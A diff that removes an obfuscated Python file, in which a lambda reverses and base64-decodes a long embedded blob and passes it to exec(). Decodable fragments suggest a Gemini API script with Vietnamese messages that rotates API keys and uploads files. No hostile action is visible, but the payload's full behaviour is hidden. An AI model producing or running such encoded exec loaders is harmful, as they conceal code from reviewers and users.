@@ -1,3 +1,309 @@
-# Obfuscated by the Botpalys encoder
-#Time: Tue May  5 07:25:45 2026
-_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'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05WZ2VGKu9Wa0NWYuQnbllGbjBCa0l2dgMmb5NXYgACIgACIgAiC6knc0BCIgAiCKkiI9RHelR3eg0Vfl1WYu9lclNXd7BiOn5WuDTGIp15uhDrxn50WiYGKk5WZwBXYuMHdyFGcgACIgACIgAiCuJXd0VmcgACIgACIgACIgACIKoDd4VGdgQ3buBiZpBCIgACIgACIKoTZzxWZgACIgogbyVHdlJHIgACIgACIgACIgAiCpIiLpFquhzGItub4oRHIn5msDzGIpVnVg4SZslmZgMWj7GekEDyg7GOa0ByZuR7wotEIM2p4igCZu9GczVmcuQnblZXZgQXahdXYgACIgACIgACIgACIKkiI9NGeltHI60HZpV3e9QWa1BSXy9mcyVGIhlGZl10WiYGK05WayBHIgACIgACIgACIgAiC6MGelBychBibvlGdwV2Y4VEI0BXZjhXZgACIgACIgAiCuJXd0VmcgACIgACIgACIgACIgACIgoQKi4Caj16w0BibiOMawByo7Guc0Byl7GOagM2o7GOsGHJxgEGsGj2YgkHoD7GIlxWamByZuFquhTGIo52i7GOkEDyj4+OoaKuIoQmbvB3clJnL05WZ2VGI0lWY3FGIgACIgACIgACIgACIgACIKoTZzxWZgACIgACIgACIgACIKkibvlGdwF2YoQmblBHch5yc0JXYwBCIgACIgACIgACIgACIgAiCpACIgACIgACIgACIgACIgAiCi4SegOsbgUGbpZGIn5WdkBSaZub4uBCdvqb40BSbzOMdgA6w2ByYNub4RSMI5N6wIBSX9VWbh52XyV2c1tHI6cmb5OMZgkWn7GOsGfmTbJiZgU2csVGIgACIgACIgACIgACIgACIgACIgoQRNlUTfV0RB1USg4WagUWbp1GImlGIgACIgACIgACIgACIgACIgACIgogIukHoD7GI1d4uhnGbgkGoDT3Lo52o6GOIoNWrDTHIuJ6woBHI5N6wIBSX9VWbh52XyV2c1tHI6cmb5OMZgkWn7GOsGfmTbJiZgACIgACIgACIgACIgACIgACIgAiCoAicvBCd4VGdg0DIu9Wa0BXYjBCIgACIgACIgACIgACIgAiCp03dhJHI6ISY0FGZiACLl1WatBiOiUGc5R3Xl1WatJyeoQmblBHch5yc0JXYwBCIgACIgACIgACIgACIgAiC6UUTJ10XD9ERg4WagUWbp1GIy9GIF1USN9VRHFUTJBibpBSZtlWbgYWagACIgACIgACIgACIKoQK3FmcgwSZtFmbmhSZtlWbfN3clV3ZfBSPgUWbp1GIgACIgACIgACIgAiCKsWYlJnYgACIgACIgACIgACIgACIgACIgACIgACIKUWbh52XlxWam5ic0RXYg0DIl1WYuZGIgACIgACIgACIgACIgACIgACIgACIgAiC6UWbh52XlxWam5ic0RXYgQmbhBSKiUWbh52XlxWamJCIsIHd0FGKyRHdhNXYoBiZpBCIgACIgACIgACIgACIgACIgACIKozclRXdilmc0RXYuQnbl1Wdj9GZuEWakVWbuc2ctBibpBic0RXYgI3bmBCIgACIgACIgACIgACIgAiC6Qnbl1Wdj9GZuEWakVWbuc2ctBCZuFGIpICduVWb1N2bkJCIsEWakVWbuc2cthic0RXYzFGagYWagACIgACIgACIgACIKUmbv5EI9ASZu9mTgwHIyR3cgoTZtFmbmBCIgACIgACIgACIgoQKzVGd5JGIsc2cthSYpRWZt9FZh9Gbud3bk5CduVWasNGI0lWY3FGI9AyclRXeiBiO3FmcgACIgACIgACIgACIKoTeyRHIgACIgACIgogOhlGZl1mLnNXbgYWagACIgogCpgCcpJHdz5SKiICIy9GI0hXZ05yZz1GKg0DI0hXZ0BCIgAiCldWYzNXZt5CduVmdlBSPgAyZz1GIgACIK01Wg0DI0NXasBiOzRnchBHIgACIKoQKoAXayR3cukiIuFquhLmIgI3bgUWbh52X0NncpZmLyVGZuV2coASPgUWbh52XyV2c1BCIgAiCKkCZpVHKkRWYuQWZt92YsV2dfBCIgACIgACIKM3chBHIgACIgACIgACIgAiC642bpRHclNGeFBCdwV2Y4VGIgACIgACIgoQK44CMoAXZlx2cu8Waj5WezFGI0lWY3FGIgACIgACIgACIgAiCpIiZpdmLl12bjxWZ3JCIsQWafRXYoNmL05WZ2VGKlxWam9FZuV2cuQnbllGbjBCdpF2dhBCIgACIgACIgACIgogO5JHdgACIgACIgAiC6QWZt92YsV2dfBibpBCdv5GIklWdgYWagACIgogCuJXd0VmcgACIgACIgAiCpACIgACIgACIKIiLqoCd6OMawBSfwYDIv8CITRkTPNURT91SD9ETC9VTBB1U7piKgE2sDj2ags4uhLGI9qb4zBibhqb4iBCLjV6uhTHIw9ruhnGdgU3v6GuTiYGIgACIgACIgACIgAiCi4GXugmbhhmbgE6w1FHIulGdgkWr7G+ZgcmbhFJxg4Wo6GuQgoiKh0WYwNHIvF6wiBCauNquhPkKqAyj4+OoaKuIgACIgACIgACIgACIKgCZu9GczVmcuQnblZXZgQXahdXYgACIgACIgAiC6IibyF2diASP9Ayc1RXY0N3XtFGczBiZpBCIgAiCuJXd0VmcgACIgACIgAiCpACIgACIgACIKIiLqoSeiOcanBSfwYDIlAyZulmbpFWblJ3egQnuDjGcg0HM2AyLvAyZulmbpFWblJ3eqoCI1F2cgkWo6GObg06uhjGdgcmbyOMbgkWdWJiZgACIgACIgACIgACIKIibc5SbhB3cg8GZgE2sDj2ag0Wo6GOdgs4uhLGIjOckEDibhqb4CByqa+J8iYGIgACIgACIgACIgAiCoQmbvB3clJnL05WZ2VGI0lWY3FGIgACIgACIgoQKpgSZtlGduUWbpRHItASKwACLklWdoQXZn5CbpRnb19FZlt2YvxmYf1WYwN3XoQnbpBSPgcmbp5Wah1WZyBCIgACIgACIKojIrN2bsJmIg0TPgMXd0FGdz9VbhB3cgYWagACIgoQKklWdo0WYwN3XrNWZoN2Xg0DIzVHdhR3cf1WYwNHIgACIKogbyVHdlJHIgACIgACIgogOkV2c1FGcfBibpBCZpVHImlGIgACIKoAZp5iclRmblNHI9ACZpVHIgACIKogbyVHdlJHIgACIgACIgogO09mYuIXZk5WZzBicvBSKyV2cVBCLyVGZuV2coU2YuFGdz5WazlGI09mbgYWagACIgoQKoIXZk5WZz9FdldmL05WZ2VGI0lWY3FGI9AiclRmblNHIgACIKoTK05WZ2VGKn5Wat92Yul2Xu92XgYWZkByYul3chpQKpUGdhZXayB3XzlmLlBiOlBSYkJWbhxWPj5WdmBCLlVncU1zZulWbvNmbphSZnF2czVWT3VmTuMHduVmdlhibv5CduVWasNGQKogCpIiLpN5uhjGIuNquhjGcgcmb0OMarByY3qb4vhGI0lWbpxGILub4iBSdBub4RSMI5V2agkEUBByo6G+YgQXp6GOVigicvJncFVWbpRnb1JFIy9GIjhXZfR3chxGIlNXahJHIgACIKkWo6GuYgQXp6GOa0Bibrqb42BCoD3GI5V2agMquhPGI0VquhTHI09ruhjGItub4oRHIjOMkEDyIgACIgogClNXahJHIgACIgACIgACIgAiCw9ruhnGdg06uhjGdgcmb0OMarBCL5F2ZuBSZzlWYyBikGKOI0lWbpxGIpNquhjGcgcmb0OMarBSaXub4MByIgACIgACIgACIgACIKUWdulGdu92YgACIgACIgACIgACIgACIgoQKl52bOBCLklWdoA3bw5yc0FGaj9lclNXdfBCIgACIgACIgACIgACIgAiCpUGbjl3YflXZr9FK0hXZuBSPg0FZpV3W5V2afJXZzV3XgACIgACIgACIgACIgACIgoQKi8WZoRHIw9ruhnGdgkXZrBSr7GOa0BikGKOIp03XfVWbh52Xf5yXfN3chx2Yf9lLjhXZ7hCI0lWbpxGILub4CBSX9hXamZWdztnLu4CI5V2SbJiZoQnbpJHcgACIgACIgACIgACIgACIgogOpInclhicvJncl9Fdp1Was91cp9FImlGIgACIgACIgACIgAiCpgicld3bs5SKjhXZoIHdzBSPgInclBCIgACIgACIgACIgowY4VGI9AyY4V2X0NXYsBCIgACIgACIgACIgogOjhXZgMXYg42bpRHclNGeFBCdwV2Y4VGIgACIgACIgogC0hXZ0BibyVHdlJHIgACIgACIgACIgAiCKUWdulGdu92YgACIgACIgACIgACIgACIgoQKl52bOBCLklWdoA3bw5yc0FGaj9lclNXdfBCIgACIgACIgACIgACIgAiCpUGbjl3YflXZr9FK0hXZuBSPg0FZpV3W5V2afJXZzV3XgACIgACIgACIgACIgACIgoQKi8WZoRHIw9ruhnGdgkXZrBSr7GOa0BikGKOIn52l7GucgE4uhbHIjqb4yRFId1HepZmZ1N3eu4iLgkXZLtlImhCdulmcwBCIgACIgACIgACIgACIgAiC6QHelRHI09mbgYWagACIgACIgACIgACIKkCKwlmc0NnLpIiIgI3bgQHelRnLwNXZyhCI9ACd4VGdgACIgACIgACIgACIKA3v6Gea0BSeltGItub4oRHIsM2o7GOsGHJxgkWn7GObgMquhLHdgcmb0OMarBSeltGISao4gcmbXub4yBSZz52bwNXZSByIgACIgACIgACIgACIKoQKzRnchBHIsU2ZhN3cl12Xk5WZz5Cdhh2YoQWYlJHa091b05ybpNmb5NXYgQXahdXYg0DIwNXZyBCIgACIgACIgACIgoQKklWdoQXYoN2X0V2ZfBSPgQXYoNGIgACIgACIgACIgAiCpkXZr1Telt2XpBXYoUmc1dWam52bj5Sah5WZnBCIgACIgACIgACIgogO5JHdgACIgACIgAiCK0lO20yW5V2ag0DI4lmZmV3cgACIgACIgAiCpkXZrhCZkFmLzlXZr9FZllmc0BCIgACIgACIKoQZ15Wa052bjBCIgACIgACIgACIgoQKl52bOBCLklWdoA3bw5yc0FGaj9lclNXdfBCIgACIgACIgACIgoQKlx2Y5N2X5V2afhCd4Vmbg0DIdRWa1tVelt2XyV2c19FIgACIgACIgACIgAiC6MXelt2XkVWayRHIulGI5V2agYWagACIgACIgAiC5F2ZuByblhGdgA3v6Gea0BSeltGIn5WYzBSejqb4o5GISao4g06uhjGdgM6wRSMI5B6wuBSeltEIjACIgACIgACIKoQKklWdokXZr9VawF2X0V2ZfBSPgkXZrBCIgACIgACIKoTKzlXZr9FZpxWY29FKuVGbgwDIpMXelt2XkVWayRHKuVGbgUGbph2dgACIgogCl52bOBSPgUmbv5EI8BibvlGdwV2Y4VEI6MGel9FdzFGbgACIgoQKoQXZzBSPg0lc0N3W0V2cgozc5V2afRWZpJHdgACIgogOyR3cg4TLgkCdzlGbgozc0JXYwBCL05WagoDZpVHKp5WatV2ZfRmblN3XgYWZkByYul3chpgCKkyUMFkTHl0UfRVSNlETg4WagMHIy9mZgInclBibpBycoknbhBibyVHdlJHIgACIKkCIgACIKwiI0V3bl1Wa0JCIsICZlRWZlNGel9VZulGbkFWZkJCIgACIgACIgoALiMDM1ICIsISZsJWYslWY2Fmb19VZjlmdyV2ciACLiQWZkF2bsJXZ29mIgACIgACIgAiCsIyc0NXZ1FXZyBSeuFWbg82b0JCIsICdp1Was9VZ0FmciACIgACIgACIKwiIkVGdzVXYohXZfV2YyV3bzVmciACLiEGdvVXciACLikjM0ICIgACIgACI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k9WbgACIgACIgAiCpQWa1hSelt2XpBXYfRXZn9FI9ACIgkXZrBCIgACIgACIKozc0FGaj9lclNXdfBibpBCdv5GIklWdgYWagACIgogOu9WazNXZTRXYoNkLpFmbldGI+0CIpQnbpBiOklWdoQXYoN2X0V2ZfBiZlRmCK03eg0DId52bpN3clNFdhh2QukWYuV2ZgwCdul2W0NWakBiOzRXYoN2XyV2c19lCK0Velt2XpBXYbNHduVWasN2X5V2afBibyVHdlJHIgACIKkCIgACIgACIgoALUBVTPJFUf1URUNVWT1jbvlGdjVnc0Nnbp9VblR3c5NHIgACIgACIgACIgAiCsUUTB50XMVERP1UPl1WYu9FblR2btBCIgACIgACIgACIgoAKsVGZv1UZ2lGdhJXZuV2RukWYuV2Zg0DIdlXZr9VawF2WzRnbllGbj9Velt2XgACIgACIgAiCpkXZr9VawFWP5V2aflGchhSZyV3ZpZmbvNmLpFmbldGIgACIgACIgogOzRnbllGbj9Velt2Xg4WagQ3buBSelt2XpBXYgYWagACIgogOsVGZv1UZ2lGdhJXZuV2RukWYuV2Zg4TLgkic0NHI6kXZr9VawFGKsVGZv12XkxWa1J2XgYWZkpgCdRWa1tVelt2XyV2c19FIuJXd0VmcgACIgoQKlx2Y5N2X5V2afhCd4Vmbg0DIdRWa1tVelt2XyV2c19FIgACIgACIgogO5V2afJXZzV3Xg4WagQ3buBCZpVHImlGIgACIKojc0NHI+0CIpQnbpBiOklWdokXZr9VawF2X0V2ZfBiZlRmCKQWasFmdg4mc1RXZyBCIgAiCKkiIpkWo6G+bsByoDHJxgQJgiDyh7GObgA3o7GOagcmb0OMarhCIg0HepZmZ1N3eu4iLgwYniDCIiYGK05WayBHIgACIgACIgACIgAiC6U2csVGIgACIgACIgoQK5V2aoQmblBHch5CZpxWY2BCIgACIgACIgACIgoQKi0HepZmZ1N3eu4iLgUIniDCIiYGK05WayBHIgACIgACIgACIgAiC6s2bgYWagACIgACIgAiCdpjNtsVeltGI9ACepZmZ1NHIgACIgACIgogOpMHdsV3clJHIsMXeltGKwlmeg4Wags2bgwSeltGIy9mZgACIgoQKdNXeltGIulGIrBicvZGIpsGK5V2afR3clR3XbpCKyVGa0F2Zu8Waj5WezFGI0lWY3FGI9Ayc0xWdzVmcgACIgogClVncUBibyVHdlJHIgACIgACIgACIgAiCtdquhjmbgkWo6G+bsBCauF6wyRHIDub4RSMIpFquhzGIvub4pdGISao4ggmbLub4RSMIjF6w4ByZuR7wotGIjF6wotGIpd5uhzEIjACIgACIgACIgACIgoQZ1JHVg4mc1RXZyBCIgACIgACIgACIgACIgAiC6kSKiQWZ0NXdhhGel9VZjJXdvNXZyJCIsISY09WdxJCIsISOyQjIoAibpBCegI3bmBicyVGIulGI4hSeuFGImlGIgACIgACIgACIgAiCpFquhzGIvub4pdGISao4gc4uhzGIwN6uhjGIutquhbHI5V2agcmbwaMauBSY09WdxBCd/qb4IByIgACIgACIgACIgACIKU2csFmRg4mc1RXZyBCIgACIgACIgACIgACIgAiC6kSKiQWasFmdgQ3buBSeltGIpBXYiACLiMDM0ICIsISMwQjIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIKwiIkVWauVGZf52bpN3cp1mclBnIgwiIklGbhZnbpJCIsICZpxWY25WaflXZr9VawFmIoAibpBCegI3bmBicyVGIulGI4hSeuFGImlGIgACIgACIgACIgAiCpFquhTHIuN5uhTHIn5GtDj2ag8CIpN5uhjGI1hGdgs4uhLGIvASahNHI5V2SgMCIgACIgACIgACIgAiCpgicld3bs5SKj